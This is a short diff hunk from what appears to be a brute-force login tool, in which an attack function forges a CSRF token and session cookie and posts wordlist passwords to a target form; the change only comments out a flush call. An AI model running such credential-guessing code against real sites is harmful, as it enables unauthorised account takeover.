@@ -112,7 +112,7 @@ def attack(username, wordlist, process_queue):
         data = {fuser: username, passwdf: "", csrf: forge[0], submit_name: submit_value}
         cookie = {"PHPSESSID": forge[1]}
         # print("Trying : " + word, end="\r")
-        sys.stdout.flush()
+        # sys.stdout.flush()
         data[passwdf] = word
         response = requests.post(target_url, data=data, cookies=cookie)
         response = str(response.content)
